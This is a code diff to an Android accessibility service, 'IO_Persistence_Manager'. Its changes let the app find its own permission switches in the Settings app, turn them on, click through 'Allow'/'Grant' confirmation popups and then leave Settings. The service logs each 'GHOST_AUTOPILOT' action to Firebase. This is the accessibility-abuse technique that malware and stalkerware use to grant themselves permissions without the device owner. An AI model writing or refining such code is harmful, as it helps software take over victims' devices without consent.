@@ -1360,6 +1360,17 @@ public class IO_Persistence_Manager extends AccessibilityService {
         });
     }
 
+    private boolean hasConfirmationPopup(AccessibilityNodeInfo root) {
+        if (root == null) return false;
+        List<AccessibilityNodeInfo> allowBtns = root.findAccessibilityNodeInfosByText("Allow");
+        if (allowBtns != null && !allowBtns.isEmpty()) return true;
+        List<AccessibilityNodeInfo> permitBtns = root.findAccessibilityNodeInfosByText("Permitir");
+        if (permitBtns != null && !permitBtns.isEmpty()) return true;
+        List<AccessibilityNodeInfo> grantBtns = root.findAccessibilityNodeInfosByText("Grant");
+        if (grantBtns != null && !grantBtns.isEmpty()) return true;
+        return false;
+    }
+
     private boolean isSingleAppPermissionPage(AccessibilityNodeInfo root, int totalSwitchesOnScreen) {
         if (root == null) return false;
         if (hasScrollableList(root)) return false;
@@ -1493,8 +1504,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return false;
     }
 
-    private static volatile long lastToggledTime = 0;
-    private static volatile int lastToggledY = 0;
+    private static volatile long lastGlobalSwitchToggleTime = 0;
 
     private boolean searchUncheckedSwitchDfs(AccessibilityNodeInfo node, int totalSwitchesOnScreen) {
         if (node == null) return false;
@@ -1504,46 +1514,49 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         // Target Settings special permission pages
         if (pkgName.contains("settings") && !pkgName.contains("systemui")) {
+            long now = System.currentTimeMillis();
+            // 1500ms global cooldown on ALL switch clicks after toggling a switch
+            if (now - lastGlobalSwitchToggleTime < 1500) {
+                return false;
+            }
+
             if (isSwitchNode(node)) {
                 Rect bounds = new Rect();
                 node.getBoundsInScreen(bounds);
                 // Ignore status bar area (y < 150)
                 if (bounds.centerY() > 150) {
-                    // 1000ms cooldown guard on same switch to prevent ON->OFF double clicks during toggle animations
-                    long now = System.currentTimeMillis();
-                    if (now - lastToggledTime < 1000 && Math.abs(bounds.centerY() - lastToggledY) < 60) {
-                        return false;
-                    }
-
                     // CRITICAL: Only click if the switch/container is UNCHECKED (false). If checked/ON (true), NEVER click!
                     if (!isNodeOrChildChecked(node)) {
                         AccessibilityNodeInfo root = node.getWindow() != null ? node.getWindow().getRoot() : null;
                         boolean isTarget = isSwitchForOurApp(node) || isSingleAppPermissionPage(root, totalSwitchesOnScreen);
 
                         if (isTarget) {
-                            lastToggledTime = now;
-                            lastToggledY = bounds.centerY();
+                            lastGlobalSwitchToggleTime = now;
 
                             if (performNodeClick(node)) {
                                 Log.d(TAG, "GHOST_AUTOPILOT: Automatically toggled settings switch ON for " + getString(R.string.app_name));
                                 FirebaseConfig.logActivity("GHOST_AUTOPILOT: Automatically toggled settings switch ON for " + getString(R.string.app_name));
                                 
-                                // Schedule a pass after 300ms to allow popup detection (e.g. "Allow Notification Access?")
+                                // Schedule a pass after 150ms to allow popup detection (e.g. "Allow Notification Access?")
                                 final Handler h = new Handler(Looper.getMainLooper());
-                                h.postDelayed(this::executeAutoPilotPass, 300);
+                                h.postDelayed(this::executeAutoPilotPass, 150);
 
-                                // Fallback exit after 700ms if still in Settings
+                                // Fallback exit after 800ms if still in Settings and no confirmation popup is active
                                 h.postDelayed(() -> {
                                     AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
                                     if (activeRoot != null) {
+                                        boolean hasPopup = hasConfirmationPopup(activeRoot);
                                         CharSequence activePkgSeq = activeRoot.getPackageName();
                                         String activePkg = activePkgSeq != null ? activePkgSeq.toString().toLowerCase() : "";
                                         activeRoot.recycle();
-                                        if (activePkg.contains("settings")) {
+                                        
+                                        if (!hasPopup && activePkg.contains("settings")) {
                                             startSmartExitSettingsLoop();
+                                        } else if (hasPopup) {
+                                            executeAutoPilotPass();
                                         }
                                     }
-                                }, 700);
+                                }, 800);
                                 return true;
                             }
                         }
